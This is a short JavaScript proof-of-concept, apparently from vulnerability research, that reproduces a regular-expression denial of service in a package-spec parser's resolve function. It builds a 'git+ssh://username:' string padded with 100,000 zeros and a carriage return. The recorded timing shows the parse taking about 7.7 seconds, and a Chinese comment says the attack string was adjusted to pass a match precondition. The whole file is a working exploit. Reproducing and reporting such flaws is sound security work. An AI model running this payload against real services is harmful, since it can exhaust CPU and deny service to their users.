const { resolve } = require("./npa.js");

//Attack String :"git+ssh://username:"+"0"*100000+"\r"
var str = "git+ssh://username:";
for (var i = 0; i < 100000; i++) {
  str += "0";
}
str += "\r";

console.log(resolve("", str, "", ""));

// real    0m7.704s
// user    0m7.652s
// sys     0m0.030s

//有前置条件(match),因此修改了攻击串
